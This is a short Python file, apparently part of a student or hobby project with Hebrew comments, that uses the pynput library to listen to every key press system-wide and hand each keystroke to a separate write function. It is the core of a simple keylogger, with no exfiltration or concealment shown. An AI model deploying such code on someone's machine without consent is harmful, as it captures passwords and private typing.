# logger.py
from pynput.keyboard import Listener
from write import write_keystroke

def on_press(key):
    """פונקציה שמופעלת כאשר מקש נלחץ"""
    try:
        write_keystroke(str(key).replace("'", ""))  # מנקה מרכאות
    except Exception as e:
        print(f"Error: {e}")

def start_logger():
    """מתחיל האזנה להקלדות"""
    with Listener(on_press=on_press) as listener:
        listener.join()
